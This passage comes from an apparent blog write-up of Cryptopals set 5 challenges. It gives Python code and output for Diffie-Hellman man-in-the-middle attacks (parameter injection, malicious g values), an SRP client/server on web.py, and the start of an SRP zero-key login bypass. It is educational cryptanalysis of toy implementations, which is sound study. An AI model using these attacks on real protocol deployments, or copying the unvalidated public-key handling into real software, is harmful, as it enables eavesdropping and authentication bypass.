    <span style="color:#75715e"># B -&gt; M</span>
    s_b <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(str(bob<span style="color:#f92672">.</span>gen_shared_secret_key(A))<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
    a_iv <span style="color:#f92672">=</span> cipher_a[<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size:]
    a_msg <span style="color:#f92672">=</span> AES_CBC_decrypt(cipher_a[:<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size], iv, s_b)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;A sent:&#34;</span>, PKCS7_unpad(a_msg))
    iv <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
    cipher_b <span style="color:#f92672">=</span> AES_CBC_encrypt(a_msg, iv, s_b) <span style="color:#f92672">+</span> iv
    
    <span style="color:#75715e"># M -&gt; A</span>
    
    <span style="color:#75715e"># Finding the key after replacing A and B with p is, in fact, very easy.</span>
    <span style="color:#75715e"># Instead of (B^a % p) or (A^b % p), the shared secret key of the exercise became (p^a % p)</span>
    <span style="color:#75715e"># and (p^b % p), both equal to zero!</span>
    mitm_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)<span style="color:#f92672">.</span>digest()[:AES<span style="color:#f92672">.</span>block_size]
    
    mitm_iv_a <span style="color:#f92672">=</span> cipher_a[<span style="color:#f92672">-</span>block_size:]
    mitm_msg_a_read <span style="color:#f92672">=</span> AES_CBC_decrypt(cipher_a[:<span style="color:#f92672">-</span>block_size], mitm_iv_a, mitm_key)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;MITM MSG A:&#34;</span>, PKCS7_unpad(mitm_msg_a_read))
    
    mitm_iv_b <span style="color:#f92672">=</span> cipher_b[<span style="color:#f92672">-</span>block_size:]
    mitm_msg_b_read <span style="color:#f92672">=</span> AES_CBC_decrypt(cipher_b[:<span style="color:#f92672">-</span>block_size], mitm_iv_b, mitm_key)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;MITM MSG B:&#34;</span>, PKCS7_unpad(mitm_msg_b_read))
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">alice <span style="color:#f92672">=</span> DiffieHellman(g, p)
bob <span style="color:#f92672">=</span> DiffieHellman(g, p)

parameter_injection_attack(alice, bob)
</code></pre></div><p><code>A sent: b'T\x1ezoR\x17vx\xc3\x99\xc2\x8d\xc2\xa4{Ey$('</code><br>
<code>MITM MSG A: b'T\x1ezoR\x17vx\xc3\x99\xc2\x8d\xc2\xa4{Ey$('</code><br>
<code>MITM MSG B: b'T\x1ezoR\x17vx\xc3\x83\xc2\x99\xc3\x82\xc2\x8d\xc3\x82\xc2\xa4{Ey$('</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-35-implement-dh-with-negotiated-groups-and-break-with-malicious-g-parameters">Challenge 35: Implement DH with negotiated groups, and break with malicious &ldquo;g&rdquo; parameters</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/35">Link</a></p>
<blockquote>
<p><strong>A-&gt;B</strong><br>
Send &ldquo;p&rdquo;, &ldquo;g&rdquo;<br>
<strong>B-&gt;A</strong><br>
Send ACK<br>
<strong>A-&gt;B</strong><br>
Send &ldquo;A&rdquo;<br>
<strong>B-&gt;A</strong><br>
Send &ldquo;B&rdquo;<br>
<strong>A-&gt;B</strong><br>
Send AES-CBC(SHA1(s)[0:16], iv=random(16), msg) + iv<br>
<strong>B-&gt;A</strong> Send AES-CBC(SHA1(s)[0:16], iv=random(16), A&rsquo;s msg) + iv<br>
Do the MITM attack again, but play with &ldquo;g&rdquo;. What happens with:<br>
<strong>g = 1</strong><br>
<strong>g = p</strong><br>
<strong>g = p - 1</strong><br>
Write attacks for each.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><p>The idea here is that:</p>
<ol>
<li>For <em>g = 1</em>, 
<ul>
<li>all powers of <em>g</em> are <em>1</em> as well, so the secret key is always <em>1</em>.</li>
</ul>
</li>
<li>For <em>g = p</em>, 
<ul>
<li>as we saw in the previous challenge, powers are all divisible by <em>p</em>, so the key is always <em>0</em>. </li>
</ul>
</li>
<li>For <em>g = p-1</em>,
<ul>
<li><em>g = p−1</em> is raised to a power, all the terms with <em>p</em> will be <em>0 mod p</em>, leaving either <em>1</em> or <em>-1</em> = <em>(p-1) mod p</em>.</li>
</ul>
</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malicious_g_attack</span>():
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Simulates the break of Diffie-Hellman with negotiated groups by using malicious &#39;g&#39; parameters.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    p <span style="color:#f92672">=</span> DiffieHellman<span style="color:#f92672">.</span>DEFAULT_P
    return_vals <span style="color:#f92672">=</span> []

    <span style="color:#75715e"># This loops over the values proposed for &#34;g&#34; by the question.</span>
    <span style="color:#66d9ef">for</span> g <span style="color:#f92672">in</span> [<span style="color:#ae81ff">1</span>, p, p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]:

        <span style="color:#75715e"># Step 1: the MITM changes the default g sent by Alice to Bob with a forced value.</span>
        alice <span style="color:#f92672">=</span> DiffieHellman()
        bob <span style="color:#f92672">=</span> DiffieHellman(g<span style="color:#f92672">=</span>g)

        <span style="color:#75715e"># Step 2: Bob receives this forced g and sends an ACK to Alice.</span>

        <span style="color:#75715e"># Step 3: Alice computes A and sends it to the MITM (thinking of Bob).</span>
        A <span style="color:#f92672">=</span> alice<span style="color:#f92672">.</span>gen_public_key()

        <span style="color:#75715e"># Step 4: Bob computes B and sends it to the MITM (thinking of Alice).</span>
        B <span style="color:#f92672">=</span> bob<span style="color:#f92672">.</span>gen_public_key()

        <span style="color:#75715e"># Step 5: Alice sends her encrypted message to Bob (without knowledge of MITM).</span>
        _msg <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello, how are you?&#34;</span>
        _a_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(str(alice<span style="color:#f92672">.</span>gen_shared_secret_key(B))<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
        _a_iv <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(AES<span style="color:#f92672">.</span>block_size)
        a_question <span style="color:#f92672">=</span> AES_CBC_encrypt(_msg, _a_iv, _a_key) <span style="color:#f92672">+</span> _a_iv

        <span style="color:#75715e"># Step 6: Bob receives the message sent by Alice (without knowing of the attack)</span>
        <span style="color:#75715e"># However, this time Bob will not be able to decrypt it, because (if I understood the</span>
        <span style="color:#75715e"># challenge task correctly) Alice and Bob now use different values of g.</span>

        <span style="color:#75715e"># Step 7: the MITM decrypts the Alice&#39;s question.</span>
        mitm_a_iv <span style="color:#f92672">=</span> a_question[<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size:]

        <span style="color:#75715e"># When g is 1, the secret key is also 1.</span>
        <span style="color:#66d9ef">if</span> g <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            mitm_hacked_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
            mitm_hacked_message <span style="color:#f92672">=</span> AES_CBC_decrypt(a_question[:<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size], mitm_a_iv, mitm_hacked_key)

        <span style="color:#75715e"># When g is equal to p, it works the same as in the S5C34 attack (the secret key is 0).</span>
        <span style="color:#66d9ef">elif</span> g <span style="color:#f92672">==</span> p:
            mitm_hacked_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
            mitm_hacked_message <span style="color:#f92672">=</span> AES_CBC_decrypt(a_question[:<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size], mitm_a_iv, mitm_hacked_key)

        <span style="color:#75715e"># When g is equal to p - 1, the secret key is (-1)^(ab), which is either (+1 % p) or (-1 % p).</span>
        <span style="color:#75715e"># We can try both and later check the padding to see which one is correct.</span>
        <span style="color:#66d9ef">else</span>:

            <span style="color:#66d9ef">for</span> candidate <span style="color:#f92672">in</span> [str(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>encode(), str(p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>encode()]:
                mitm_hacked_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(candidate)<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
                mitm_hacked_message <span style="color:#f92672">=</span> AES_CBC_decrypt(a_question[:<span style="color:#f92672">-</span>AES<span style="color:#f92672">.</span>block_size], mitm_a_iv, mitm_hacked_key)
                <span style="color:#66d9ef">if</span> PKCS7_padded(mitm_hacked_message):
                    mitm_hacked_message <span style="color:#f92672">=</span> PKCS7_unpad(mitm_hacked_message)
                    <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">print</span>(mitm_hacked_message)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">malicious_g_attack()
</code></pre></div><p><code>b'Hello, how are you?\r\r\r\r\r\r\r\r\r\r\r\r\r'</code><br>
<code>b'Hello, how are you?\r\r\r\r\r\r\r\r\r\r\r\r\r'</code><br>
<code>b'Hello, how are you?'</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-36-implement-secure-remote-password-srp">Challenge 36: Implement Secure Remote Password (SRP)</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/36">Link</a></p>
<blockquote>
<p>To understand SRP, look at how you generate an AES key from DH; now, just observe you can do the &ldquo;opposite&rdquo; operation an generate a numeric parameter from a hash. Then:<br>
Replace A and B with C and S (client &amp; server)<br>
<strong>C &amp; S</strong><br>
Agree on N=[NIST Prime], g=2, k=3, I (email), P (password)<br>
<strong>S</strong><br>
Generate salt as random integer<br>
Generate string xH=SHA256(salt|password)<br>
Convert xH to integer x somehow (put 0x on hexdigest)<br>
Generate v=g**x % N<br>
Save everything but x, xH<br>
<strong>C-&gt;S</strong><br>
Send I, A=g**a % N (a la Diffie Hellman)<br>
<strong>S-&gt;C</strong><br>
Send salt, B=kv + g**b % N<br>
<strong>S, C</strong><br>
Compute string uH = SHA256(A|B), u = integer of uH<br>
<strong>C</strong><br>
Generate string xH=SHA256(salt|password)<br>
Convert xH to integer x somehow (put 0x on hexdigest)<br>
Generate S = (B - k * g**x)**(a + u * x) % N<br>
Generate K = SHA256(S)<br>
<strong>S</strong><br>
Generate S = (A * v**u) ** b % N<br>
Generate K = SHA256(S)<br>
<strong>C-&gt;S</strong><br>
Send HMAC-SHA256(K, salt)<br>
<strong>S-&gt;C</strong><br>
Send &ldquo;OK&rdquo; if HMAC-SHA256(K, salt) validates<br>
You&rsquo;re going to want to do this at a REPL of some sort; it may take a couple tries.<br>
It doesn&rsquo;t matter how you go from integer to string or string to integer (where things are going in or out of SHA256) as long as you do it consistently. I tested by using the ASCII decimal representation of integers as input to SHA256, and by converting the hexdigest to an integer when processing its output.<br>
This is basically Diffie Hellman with a tweak of mixing the password into the public keys. The server also takes an extra step to avoid storing an easily crackable password-equivalent.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> web
<span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> hashlib
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Client and server agree on these values beforehand</span>

<span style="color:#75715e"># Generated using &#34;openssl dhparam -text 1024&#34;.</span>
N <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb9&#34;</span>
        <span style="color:#e6db74">&#34;18d30431fca1770760aa48be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e&#34;</span>
        <span style="color:#e6db74">&#34;01ac1fa9bdefd1f04f95f197b000486c43917568ff58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33&#34;</span>, <span style="color:#ae81ff">16</span>)
g <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
k <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
I <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hextersik@hexterisk.com&#34;</span>
P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hexterisk&#34;</span>
</code></pre></div><p>I used web.py to build the server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">urls <span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#39;/hello&#39;</span>, <span style="color:#e6db74">&#39;Hello&#39;</span>,
    <span style="color:#e6db74">&#39;/init&#39;</span>, <span style="color:#e6db74">&#39;Initiate&#39;</span>,
    <span style="color:#e6db74">&#39;/verify&#39;</span>, <span style="color:#e6db74">&#39;Verify&#39;</span>
)

app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>application(urls, globals())

K <span style="color:#f92672">=</span> None
salt <span style="color:#f92672">=</span> str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
<span style="color:#75715e"># since we can&#39;t save x, xH</span>
v <span style="color:#f92672">=</span> pow(g, int(hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>P<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>), N)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>:        
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        name <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>name
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name:
            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;World&#39;</span>
            
        string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, &#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;name&#34;</span> : string}
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Verify</span>:

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        hmac_received <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>hmac
        
        HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())
        
        <span style="color:#66d9ef">if</span> hmac <span style="color:#f92672">==</span> hmac_received:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Initiate</span>:
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        I <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>I
        A <span style="color:#f92672">=</span> int(params<span style="color:#f92672">.</span>A)
        
        b <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
        B <span style="color:#f92672">=</span> k<span style="color:#f92672">*</span>v <span style="color:#f92672">+</span> pow(g, b, N)
        
        uH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(A)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>str(B)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
        u <span style="color:#f92672">=</span> int(uH, <span style="color:#ae81ff">16</span>)
        S <span style="color:#f92672">=</span> pow(A <span style="color:#f92672">*</span> pow(v, u, N), b, N)
        K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
        
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;salt&#34;</span>:salt, <span style="color:#e6db74">&#34;B&#34;</span>:B}
</code></pre></div><p>Test the web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">response1 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=&#34;</span>)
<span style="color:#66d9ef">print</span>(response1<span style="color:#f92672">.</span>data)

response2 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=hexterisk&#34;</span>)
<span style="color:#66d9ef">print</span>(json<span style="color:#f92672">.</span>loads(response2<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>)))
</code></pre></div><p><code>b&quot;{'name': 'Hello, World!'}&quot;</code><br>
<code>{'name': 'Hello, hexterisk!'}</code></p>
<p><strong>SRP</strong> (<strong>Secure Remote Protocol</strong>) is an authentication method where the user/client need not share their password. Rather, the server stores a verifier:</p>
<p><em>v = gˣ , where x = H(salt || password).</em></p>
<p>After exchanging various parameters, both the client and the server generate a session key <em>K</em>. The server generates it with the verifier while the client generates it with the password. The server checks that the value of <em>K</em> should be same on both ends.</p>
<p>Refer <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">Wikipedia</a> for a complete explanation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">implement_SRP</span>() <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Implements SRP(Secure Remote Password).
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    a <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
    A <span style="color:#f92672">=</span> pow(g, a, N)
    
    response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/init?I=&#34;</span> <span style="color:#f92672">+</span> I <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;amp;A=&#34;</span> <span style="color:#f92672">+</span> str(A))
    response_dict <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>))
    salt <span style="color:#f92672">=</span> response_dict[<span style="color:#e6db74">&#34;salt&#34;</span>]
    B <span style="color:#f92672">=</span> int(response_dict[<span style="color:#e6db74">&#34;B&#34;</span>])

    uH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(A)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>str(B)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
    u <span style="color:#f92672">=</span> int(uH, <span style="color:#ae81ff">16</span>)
    
    xH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>P<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
    x <span style="color:#f92672">=</span> int(xH, <span style="color:#ae81ff">16</span>)
    
    S <span style="color:#f92672">=</span> pow((B <span style="color:#f92672">-</span> k <span style="color:#f92672">*</span> pow(g, x, N)), (a <span style="color:#f92672">+</span> u <span style="color:#f92672">*</span> x), N)
    K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()

    HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
    hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())
    
    response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/verify?hmac=&#34;</span> <span style="color:#f92672">+</span> hmac)
    <span style="color:#66d9ef">assert</span> response<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;OK&#34;</span>
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Verification successful.&#34;</span>)
    <span style="color:#66d9ef">return</span> True
</code></pre></div><p><code>&gt; Verification successful.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-37-break-srp-with-a-zero-key">Challenge 37: Break SRP with a zero key</h3>
<p><a href="https://cryptopals.com/sets/5/challenges/37">Link</a></p>
<blockquote>
<p>Get your SRP working in an actual client-server setting. &ldquo;Log in&rdquo; with a valid password using the protocol.<br>
Now log in without your password by having the client send 0 as its &ldquo;A&rdquo; value. What does this to the &ldquo;S&rdquo; value that both sides compute?<br>
Now log in without your password by having the client send N, N*2, &amp;c.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> web
<span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> random
<span style="color:#f92672">import</span> hashlib
</code></pre></div><p>I used web.py to build the server.</p>
<p>NOTE: The attack is only possible if the server doesn&rsquo;t check the value of client&rsquo;s public key against zero.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">urls <span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#39;/hello&#39;</span>, <span style="color:#e6db74">&#39;Hello&#39;</span>,
    <span style="color:#e6db74">&#39;/init&#39;</span>, <span style="color:#e6db74">&#39;Initiate&#39;</span>,
    <span style="color:#e6db74">&#39;/verify&#39;</span>, <span style="color:#e6db74">&#39;Verify&#39;</span>
)

app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>application(urls, globals())

K <span style="color:#f92672">=</span> None
salt <span style="color:#f92672">=</span> str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
<span style="color:#75715e"># since we can&#39;t save x, xH</span>
v <span style="color:#f92672">=</span> pow(g, int(hashlib<span style="color:#f92672">.</span>sha256(salt<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>P<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>), N)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>:        
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        name <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>name
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name:
            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;World&#39;</span>
            
        string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, &#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;name&#34;</span> : string}
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Verify</span>:

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        hmac_received <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>hmac
        
        HMAC_obj <span style="color:#f92672">=</span> HMAC(K, hashlib<span style="color:#f92672">.</span>sha256)
        hmac <span style="color:#f92672">=</span> HMAC_obj<span style="color:#f92672">.</span>compute(salt<span style="color:#f92672">.</span>encode())
        
        <span style="color:#66d9ef">if</span> hmac <span style="color:#f92672">==</span> hmac_received:
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Initiate</span>:
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
        
        <span style="color:#66d9ef">global</span> K, salt
        
        params <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()
        I <span style="color:#f92672">=</span> params<span style="color:#f92672">.</span>I
        A <span style="color:#f92672">=</span> int(params<span style="color:#f92672">.</span>A)
        
        b <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, N <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
        B <span style="color:#f92672">=</span> k<span style="color:#f92672">*</span>v <span style="color:#f92672">+</span> pow(g, b, N)
        
        uH <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(A)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>str(B)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
        u <span style="color:#f92672">=</span> int(uH, <span style="color:#ae81ff">16</span>)
        <span style="color:#75715e"># S will be zero since modulo N will be zero for 0 and multiples of N</span>
        S <span style="color:#f92672">=</span> pow(A <span style="color:#f92672">*</span> pow(v, u, N), b, N)
        K <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(str(S)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
        
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;salt&#34;</span>:salt, <span style="color:#e6db74">&#34;B&#34;</span>:B}
</code></pre></div><p>Test the web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">response1 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=&#34;</span>)
<span style="color:#66d9ef">print</span>(response1<span style="color:#f92672">.</span>data)

response2 <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;/hello?name=hexterisk&#34;</span>)
